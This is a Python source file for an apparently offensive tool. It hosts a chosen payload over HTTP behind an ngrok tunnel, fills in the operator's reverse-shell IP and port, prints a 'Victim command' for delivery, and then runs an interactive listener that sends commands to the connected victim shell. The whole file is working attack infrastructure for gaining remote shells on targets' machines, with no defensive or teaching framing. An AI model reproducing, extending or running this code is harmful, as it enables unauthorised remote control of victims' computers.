import socket, os, threading, time, sys, json
from http.server import BaseHTTPRequestHandler, HTTPServer
from pyngrok import ngrok

class Log:
    def info(self, msg):
        print("[*] " + msg)

    def error(self, msg):
        print("[!] " + msg)

    def verbose(self, msg):
        print("[!] " + msg)

    def success(self, msg):
        print("[+] " + msg)

    def inpt(self, msg):
        return input("[>] " + msg)

class RevServer:
    def __init__(self, host, port):
        self.log = Log()
        self.host = host
        self.port = port

    def start(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, int(self.port)))
        s.listen(1)
        self.log.info("Listening on " + self.host + ":" + self.port)
        conn, addr = s.accept()
        self.log.info("Connection from " + addr[0] + ":" + str(addr[1]))
        while True:
            ans = conn.recv(1024).decode()
            if ans:
                sys.stdout.write(ans)
            command = input()
            command += "\n"
            conn.send(command.encode())
            time.sleep(1)



def create_handler(payload):
    class PayServer(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(payload)

        def log_message(self, format, *args):
            print(f"[!] {self.address_string()} [{self.log_date_time_string()}] {format % args}")
    return PayServer

class NgrokServer:
    def __init__(self, key):
        self.log = Log()
        self.key = key
        self.url = ""

    def load_port(self):
        with open("Assets/config.json", "r") as f:
            data = json.load(f)

            return data.get("web_port")

    def start(self):
        ngrok.set_auth_token(self.key)
        tunnel = ngrok.connect(self.load_port(), "http")
        self.url = tunnel.public_url
        self.log.info("Ngrok tunnel: " + tunnel.public_url)

class Main:
    def __init__(self):
        self.log = Log()
        self.key()
        self.setup()
        self.web_host, self.web_port = self.load_host()
        self.rev_host = self.log.inpt("Reverse host: ")
        self.rev_port = self.log.inpt("Reverse port: ")
        self.rev_server = RevServer(self.rev_host, self.rev_port)
        self.ngrok_server = NgrokServer(self.key())

    def setup(self):
        if not os.path.exists("Assets/config.json"):
            key = self.log.inpt("Ngrok Key: ")
            web_host = self.log.inpt("Web host: ")
            web_port = self.log.inpt("Web port: ")
            with open("Assets/config.json", "w") as f:
                json.dump({"ngrok_key": key, "web_host": web_host, "web_port": web_port}, f, indent=4)
            return

    def key(self):
        if not os.path.exists("Assets/config.json"):
            key = self.log.inpt("Ngrok key: ")
            with open("Assets/config.json", "w") as f:
                json.dump({"ngrok_key": key}, f, indent=4)
            return key
        with open("Assets/config.json", "r") as f:
            return json.load(f)["ngrok_key"]
        
    def load_host(self):
        with open("Assets/config.json", "r") as f:
            data = json.load(f)
            return data.get("web_host"), data.get("web_port")

    def load_payload(self, file):
        with open(f"Assets/Payloads/{file + '.txt'}", "r") as f:
            return f.read().replace("_IP_", self.rev_host).replace("_PORT_", f"{self.rev_port}").encode("utf-8")

    def load_delivery(self, file):
        with open(f"Assets/Deliveries/{file + '.txt'}", "r") as f:
            return f.read().replace("URL", self.url)

    def show_loads(self):
        self.log.verbose("Available payloads")
        for file in os.listdir("Assets/Payloads"):
            self.log.info(file.split(".")[0])

    def show_deliveries(self):
        self.log.verbose("Available deliveries")
        for file in os.listdir("Assets/Deliveries"):
            self.log.info(file.split(".")[0])

    def start_server(self, load):
        load = self.load_payload(load)
        self.log.info("Sellected payload: " + load.decode("utf-8"))
        handler = create_handler(load)
        with HTTPServer((self.web_host, self.web_port), handler) as httpd:
            httpd.serve_forever()

    def main(self):
        self.show_loads()
        payload = self.log.inpt("Payload: ")
        self.show_deliveries()
        delivery = self.log.inpt("Delivery: ")
        self.ngrok_server.start()
        self.url = self.ngrok_server.url
        threading.Thread(target=self.start_server, args=(payload,)).start()
        self.log.info("Victim command: " + self.load_delivery(delivery))
        self.rev_server.start()
        input()

if __name__ == "__main__":
    main = Main()
    main.main()